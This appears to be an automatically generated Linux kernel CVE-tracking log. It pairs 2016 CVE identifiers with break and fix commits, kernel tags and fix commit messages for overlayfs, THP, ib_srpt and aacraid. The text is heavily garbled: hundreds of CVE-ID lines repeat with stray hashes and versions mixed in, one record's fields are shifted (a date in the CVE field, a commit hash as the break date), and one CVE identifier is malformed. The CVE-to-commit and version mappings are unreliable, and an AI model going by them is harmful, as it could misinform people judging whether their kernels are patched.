The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
CVE-2013-4312:
CVE-2013-7421:
CVE-2013-7421:
CVE-2013-7446:
CVE-2014-0155:
CVE-2014-0181:
CVE-2014-0196:
CVE-2014-0206:
CVE-2014-1737:
CVE-2014-1738:
CVE-2014-1739:
CVE-2014-2580:
CVE-2014-2678:
CVE-2014-2739:
CVE-2014-2851:
CVE-2014-3122:
CVE-2014-3144:
CVE-2014-3145:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3181:
CVE-2014-3182:
CVE-2014-3183:
CVE-2014-3184:
CVE-2014-3185:
CVE-2014-3186:
CVE-2014-3534:
CVE-2014-3601:
CVE-2014-3610:
CVE-2014-3611:
CVE-2014-3631:
CVE-2014-3646:
CVE-2014-3647:
CVE-2014-3647:
CVE-2014-3673:
CVE-2014-3687:
CVE-2014-3688:
CVE-2014-3690:
CVE-2014-3917:
CVE-2014-3940:
CVE-2014-4014:
CVE-2014-4157:
CVE-2014-4171:
CVE-2014-4171:
CVE-2014-4171:
CVE-2014-4508:
CVE-2014-4608:
CVE-2014-4608:
CVE-2014-4611:
CVE-2014-4652:
CVE-2014-4653:
CVE-2014-4654:
CVE-2014-4655:
CVE-2014-4656:
CVE-2014-4656:
CVE-2014-4667:
CVE-2014-4699:
CVE-2014-4943:
CVE-2014-5045:
CVE-2014-5077:
CVE-2014-5206:
CVE-2014-5206:
CVE-2014-5207:
CVE-2014-5207:
CVE-2014-5471:
CVE-2014-5472:
CVE-2014-6410:
CVE-2014-6416:
CVE-2014-6417:
CVE-2014-6418:
CVE-2014-7145:
CVE-2014-7283:
CVE-2014-7284:
CVE-2014-7822:
CVE-2014-7825:
CVE-2014-7826:
CVE-2014-7841:
CVE-2014-7842:
CVE-2014-7843:
CVE-2014-7970:
CVE-2014-7975:
CVE-2014-8086:
CVE-2014-8133:
CVE-2014-8134:
CVE-2014-8159:
CVE-2014-8160:
CVE-2014-8369:
CVE-2014-8480:
CVE-2014-8480:
CVE-2014-8481:
CVE-2014-8559:
CVE-2014-8559:
CVE-2014-8884:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-9090:
CVE-2014-9322:
CVE-2014-9322:
CVE-2014-9419:
CVE-2014-9420:
CVE-2014-9428:
CVE-2014-9529:
CVE-2014-9584:
CVE-2014-9585:
CVE-2014-9644:
CVE-2014-9683:
CVE-2014-9710:
CVE-2014-9715:
CVE-2014-9717:
CVE-2014-9728:
CVE-2014-9728:
CVE-2014-9728:
CVE-2014-9729:
CVE-2014-9730:
CVE-2014-9731:
CVE-2014-9803:
CVE-2014-9904:
CVE-2015-0239:
CVE-2015-0272:
CVE-2015-0274:
CVE-2015-0275:
CVE-2015-1328:
CVE-2015-1333:
CVE-2015-1339:
CVE-2015-1420:
CVE-2015-1421:
CVE-2015-1465:
CVE-2015-1573:
CVE-2015-1593:
CVE-2015-1805:
CVE-2015-1805:
CVE-2015-2041:
CVE-2015-2042:
CVE-2015-2150:
CVE-2015-2666:
CVE-2015-2672:
CVE-2015-2686:
CVE-2015-2830:
CVE-2015-2922:
CVE-2015-2925:
CVE-2015-2925:
CVE-2015-3212:
CVE-2015-3288:
CVE-2015-3290:
CVE-2015-3291:
CVE-2015-3331:
CVE-2015-3332:
CVE-2015-3636:
CVE-2015-4001:
CVE-2015-4002:
CVE-2015-4002:
CVE-2015-4003:
CVE-2015-4004:
CVE-2015-4036:
CVE-2015-4167:
CVE-2015-4176:
CVE-2015-4177:
CVE-2015-4178:
CVE-2015-4692:
CVE-2015-4700:
CVE-2015-5156:
CVE-2015-5157:
CVE-2015-5257:
CVE-2015-5283:
CVE-2015-5307:
CVE-2015-5327:
CVE-2015-5364:
CVE-2015-5366:
CVE-2015-5697:
CVE-2015-5706:
CVE-2015-5707:
CVE-2015-5707:
CVE-2015-6252:
CVE-2015-6526:
CVE-2015-6937:
CVE-2015-7312:
CVE-2015-7513:
CVE-2015-7515:
CVE-2015-7550:
CVE-2015-7566:
CVE-2015-7613:
CVE-2015-7799:
CVE-2015-7799:
CVE-2015-7833:
CVE-2015-7833:
CVE-2015-7837:
CVE-2015-7872:
CVE-2015-7884:
CVE-2015-7885:
CVE-2015-7990:
CVE-2015-8019:
CVE-2015-8104:
CVE-2015-8215:
CVE-2015-8374:
CVE-2015-8539:
CVE-2015-8543:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8569:
CVE-2015-8575:
CVE-2015-8660:
CVE-2015-8709:
CVE-2015-8746:
CVE-2015-8767:
CVE-2015-8785:
CVE-2015-8787:
CVE-2015-8812:
CVE-2015-8816:
CVE-2015-8830:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8844:
CVE-2015-8845:
CVE-2015-8944:
CVE-2015-8950:
CVE-2015-8952:
CVE-2015-8953:
CVE-2015-8955:
CVE-2015-8956:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2016-0617:
CVE-2016-0723:
CVE-2016-0728:
CVE-2016-0758:
CVE-2016-0774:
CVE-2016-0821:
CVE-2016-0823:
CVE-2016-1237:
CVE-2016-1237:
CVE-2016-1575:
CVE-2016-1575:
CVE-2016-1576:
CVE-2016-1576:
CVE-2016-1583:
CVE-2016-1583:
CVE-2016-1583:
CVE-2016-2053:
CVE-2016-2069:
CVE-2016-2069:
CVE-2016-2070:
CVE-2016-2085:
CVE-2016-2117:
CVE-2016-2143:
CVE-2016-2184:
CVE-2016-2184:
CVE-2016-2185:
CVE-2016-2186:
CVE-2016-2187:
CVE-2016-2188:
CVE-2016-2383:
CVE-2016-2384:
CVE-2016-2543:
CVE-2016-2544:
CVE-2016-2545:
CVE-2016-2546:
CVE-2016-2547:
CVE-2016-2548:
CVE-2016-2549:
CVE-2016-2550:
CVE-2016-2782:
CVE-2016-2847:
CVE-2016-3070:
CVE-2016-3134:
CVE-2016-3134:
CVE-2016-3134:
CVE-2016-3135:
CVE-2016-3136:
CVE-2016-3137:
CVE-2016-3138:
CVE-2016-3140:
CVE-2016-3156:
CVE-2016-3157:
CVE-2016-3672:
CVE-2016-3689:
CVE-2016-3713:
CVE-2016-3841:
CVE-2016-3857:
CVE-2016-3951:
CVE-2016-3951:
CVE-2016-3955:
CVE-2016-3961:
CVE-2016-4440:
CVE-2016-4470:
CVE-2016-4482:
CVE-2016-4485:
CVE-2016-4486:
CVE-2016-4557:
CVE-2016-4558:
CVE-2016-4565:
CVE-2016-4569:
CVE-2016-4578:
CVE-2016-4578:
CVE-2016-4580:
CVE-2016-4581:
CVE-2016-4794:
CVE-2016-4794:
CVE-2016-4805:
CVE-2016-4913:
CVE-2016-4951:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-5195:
CVE-2016-5243:
CVE-2016-5244:
CVE-2016-5400:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.6:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.7:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
51093254bf879bc9ce96590400a87897c7498463:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-8658:
CVE-2016-8666:
2012-09-28:
CVE-2016-8666:
2016-09-07:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.2:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
f69bcbf3b4c4b333dcd7a48eaf868bf0c88edab5:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.7:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.6:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
43761473c254b45883a64441dd0bc85a42f3645c:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.8:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
30a46a4647fd1df9cf52e43bf467f0d9265096ca:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-22016-06-27:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
3.15:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
ff19f63ed47309550b47831ac39176d9910fadfe:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2016-07-08:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
9bf292bfca94694a721449e3fd752493856710f6:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
1a1a143daf84db95dd7212086042004a3abb7bc2:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-5195:
CVE-2016-5243:
CVE-2016-5244:
CVE-2016-5400:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
*************

*** This is a new CVE ***
This CVE has been resolved in 09a2499466dc69d1e54e8e879d4591cdd0ca17c8.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Author: Andrea Arcangeli <aarcange@redhat.com>
Date:   Fri Feb 26 15:19:28 2016 -0800

    mm: thp: fix SMP race condition between THP page fault and MADV_DONTNEED
    
    commit ad33bb04b2a6cee6c1f99fabb15cddbf93ff0433 upstream.
    
    pmd_trans_unstable()/pmd_none_or_trans_huge_or_clear_bad() were
    introduced to locklessy (but atomically) detect when a pmd is a regular
    (stable) pmd or when the pmd is unstable and can infinitely transition
    from pmd_none() and pmd_trans_huge() from under us, while only holding
    the mmap_sem for reading (for writing not).
    
    While holding the mmap_sem only for reading, MADV_DONTNEED can run from
    under us and so before we can assume the pmd to be a regular stable pmd
    we need to compare it against pmd_none() and pmd_trans_huge() in an
    atomic way, with pmd_trans_unstable().  The old pmd_trans_huge() left a
    tiny window for a race.
    
    Useful applications are unlikely to notice the difference as doing
    MADV_DONTNEED concurrently with a page fault would lead to undefined
    behavior.
    
    [js] 3.12 backport: no pmd_devmap in 3.12 yet.
    
    [akpm@linux-foundation.org: tidy up comment grammar/layout]
    Signed-off-by: Andrea Arcangeli <aarcange@redhat.com>
    Reported-by: Kirill A. Shutemov <kirill.shutemov@linux.intel.com>
    Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
    Cc: Vlastimil Babka <vbabka@suse.cz>
    Signed-off-by: Jiri Slaby <jslaby@suse.cz>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 mm/memory.c |   14 ++++++++++++--
 1 file changed, 12 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: -
CVE: 2016-09-11
Break Date: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Break Commit: 3.14.79
Break Tag: -
Linus Fix Date: 2016-09-11
Linus Commit: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Linus Tag: 3.14.79
Stable Date: -
Stable Commit: 2016-09-11
Stable Tag: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8

CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 11f3710417d026ea2f4fcf362d866342c5274185
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Mon Mar 21 17:31:44 2016 +0100

    ovl: verify upper dentry before unlink and rename
    
    Unlink and rename in overlayfs checked the upper dentry for staleness by
    verifying upper->d_parent against upperdir.  However the dentry can go
    stale also by being unhashed, for example.
    
    Expand the verification to actually look up the name again (under parent
    lock) and check if it matches the upper dentry.  This matches what the VFS
    does before passing the dentry to filesytem's unlink/rename methods, which
    excludes any inconsistency caused by overlayfs.
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>

 fs/overlayfs/dir.c |   59 +++++++++++++++++++++++++++++++++-------------------
 1 file changed, 38 insertions(+), 21 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6197
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-21
Linus Commit: 11f3710417d026ea2f4fcf362d866342c5274185
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 54d5ca871e72f2bb172ec9323497f01cd5091ec7
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Wed May 11 01:16:37 2016 +0200

    vfs: add vfs_select_inode() helper
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/open.c              |   12 ++++--------
 include/linux/dcache.h |   12 ++++++++++++
 2 files changed, 16 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6198
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-10
Linus Commit: 54d5ca871e72f2bb172ec9323497f01cd5091ec7
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Wed May 11 01:16:37 2016 +0200

    vfs: rename: check backing inode being equal
    
    If a file is renamed to a hardlink of itself POSIX specifies that rename(2)
    should do nothing and return success.
    
    This condition is checked in vfs_rename().  However it won't detect hard
    links on overlayfs where these are given separate inodes on the overlayfs
    layer.
    
    Overlayfs itself detects this condition and returns success without doing
    anything, but then vfs_rename() will proceed as if this was a successful
    rename (detach_mounts(), d_move()).
    
    The correct thing to do is to detect this condition before even calling
    into overlayfs.  This patch does this by calling vfs_select_inode() to get
    the underlying inodes.
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/namei.c |    6 +++++-
 1 file changed, 5 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6198
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-10
Linus Commit: 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6327:
CVE-2016-6327:
51093254bf879bc9ce96590400a87897c7498463:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 51093254bf879bc9ce96590400a87897c7498463
Author: Bart Van Assche <bart.vanassche@sandisk.com>
Date:   Thu Feb 11 11:03:09 2016 -0800

    IB/srpt: Simplify srpt_handle_tsk_mgmt()
    
    Let the target core check task existence instead of the SRP target
    driver. Additionally, let the target core check the validity of the
    task management request instead of the ib_srpt driver.
    
    This patch fixes the following kernel crash:
    
    BUG: unable to handle kernel NULL pointer dereference at 0000000000000001
    IP: [<ffffffffa0565f37>] srpt_handle_new_iu+0x6d7/0x790 [ib_srpt]
    Oops: 0002 [#1] SMP
    Call Trace:
     [<ffffffffa05660ce>] srpt_process_completion+0xde/0x570 [ib_srpt]
     [<ffffffffa056669f>] srpt_compl_thread+0x13f/0x160 [ib_srpt]
     [<ffffffff8109726f>] kthread+0xcf/0xe0
     [<ffffffff81613cfc>] ret_from_fork+0x7c/0xb0
    
    Signed-off-by: Bart Van Assche <bart.vanassche@sandisk.com>
    Fixes: 3e4f574857ee ("ib_srpt: Convert TMR path to target_submit_tmr")
    Tested-by: Alex Estrin <alex.estrin@intel.com>
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Cc: Nicholas Bellinger <nab@linux-iscsi.org>
    Cc: Sagi Grimberg <sagig@mellanox.com>
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Doug Ledford <dledford@redhat.com>

 drivers/infiniband/ulp/srpt/ib_srpt.c |   59 +--------------------------------
 1 file changed, 1 insertion(+), 58 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6327
Break Date: 2012-11-28
Break Commit: 3e4f574857eebce60bb56d7524f3f9eaa2a126d0
Break Tag: 3.8
Linus Fix Date: 2016-02-29
Linus Commit: 51093254bf879bc9ce96590400a87897c7498463
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.78.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Author: Dave Carroll <david.carroll@microsemi.com>
Date:   Fri Aug 5 13:44:10 2016 -0600

    aacraid: Check size values after double-fetch from user
    
    In aacraid's ioctl_send_fib() we do two fetches from userspace, one the
    get the fib header's size and one for the fib itself. Later we use the
    size field from the second fetch to further process the fib. If for some
    reason the size from the second fetch is different than from the first
    fix, we may encounter an out-of- bounds access in aac_fib_send(). We
    also check the sender size to insure it is not out of bounds. This was
    reported in https://bugzilla.kernel.org/show_bug.cgi?id=116751 and was
    assigned CVE-2016-6480.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
